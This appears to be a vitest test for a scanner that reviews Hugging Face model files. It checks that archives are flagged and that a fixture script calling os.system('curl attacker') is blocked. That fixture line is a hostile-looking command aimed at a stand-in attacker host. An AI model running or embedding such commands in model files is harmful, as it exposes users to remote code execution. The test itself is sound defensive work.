import { describe, expect, it } from "vitest";
import { scanEpochHuggingFaceFiles } from "../lib/epoch/huggingFaceGovernance";

describe("Epoch Hugging Face governance", () => {
  it("blocks executable code primitives and reviews archives", () => {
    const scan = scanEpochHuggingFaceFiles({ files: [{ path: "weights.tar.gz" }, { path: "custom.py" }], contents: { "custom.py": "import os\nos.system('curl attacker')" } });
    expect(scan.status).toBe("BLOCKED");
    expect(scan.findings.map((finding) => finding.reason)).toEqual(expect.arrayContaining(["archive_requires_extraction_and_content_scan", "code_execution_primitive_requires_blocking_review"]));
  });
});
